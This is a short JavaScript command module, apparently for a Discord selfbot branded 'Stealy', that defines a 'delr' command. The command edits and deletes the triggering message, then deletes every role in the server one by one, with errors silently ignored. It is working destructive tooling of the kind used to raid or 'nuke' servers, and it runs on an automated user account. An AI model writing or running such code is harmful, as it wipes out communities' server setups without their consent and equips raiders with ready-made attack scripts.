const { Client, Message } = require('legend.js');

module.exports = {
    name: "delr",
    owner: true,
    permission: "MANAGE_ROLES",
    /**
     * @param {Client} client
     * @param {Message} message
     * @param {string[]} args 
    */
    run: async (client, message, args) => {
        message.edit("<a:star:1345073135095123978> **__Stealy__** <a:star:1345073135095123978>")
        message.delete().catch(() => false)

        for (const role of message.guild.roles.values()){
            try {
                await role.delete()
                await client.sleep(1000);
            } catch {}
        }
    },
};